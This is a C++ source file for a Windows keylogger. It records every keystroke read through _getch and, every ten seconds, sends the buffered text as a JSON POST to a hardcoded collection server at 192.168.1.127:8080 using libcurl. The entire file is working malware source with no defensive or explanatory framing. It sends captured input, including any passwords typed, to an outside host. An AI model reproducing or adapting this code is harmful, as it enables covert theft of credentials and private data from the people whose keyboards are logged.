#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <mutex>
#include <curl/curl.h> // Install libcurl for handling HTTP requests
#include <conio.h> // For capturing key inputs (Windows specific)

std::string text = "";
std::string ip_address = "192.168.1.127";
std::string port_number = "8080";
int time_interval = 10;
std::mutex text_mutex;

void send_post_req() {
    try {
        std::lock_guard<std::mutex> lock(text_mutex);
        std::string payload = "{\"keyboardData\": \"" + text + "\"}";

        CURL *curl;
        CURLcode res;

        curl = curl_easy_init();
        if (curl) {
            std::string url = "http://" + ip_address + ":" + port_number;

            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
            struct curl_slist *headers = nullptr;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

            res = curl_easy_perform(curl);

            if (res != CURLE_OK) {
                std::cerr << "Failed to send POST request: " << curl_easy_strerror(res) << std::endl;
            }

            curl_slist_free_all(headers);
            curl_easy_cleanup(curl);
        }

        text.clear();
    } catch (...) {
        std::cerr << "Couldn't complete request!" << std::endl;
    }

    std::this_thread::sleep_for(std::chrono::seconds(time_interval));
    send_post_req();
}

void on_press(char key) {
    std::lock_guard<std::mutex> lock(text_mutex);

    switch (key) {
        case '\n':
            text += "\n";
            break;
        case '\t':
            text += "\t";
            break;
        case ' ':
            text += " ";
            break;
        case '\b':
            if (!text.empty()) {
                text.pop_back();
            }
            break;
        case 27: // ESC key
            exit(0);
        default:
            text += key;
            break;
    }
}

int main() {
    std::thread timer_thread(send_post_req);
    timer_thread.detach();

    std::cout << "Keylogger started. Press ESC to quit." << std::endl;

    while (true) {
        if (_kbhit()) {
            char key = _getch();
            on_press(key);
        }
    }

    return 0;
}
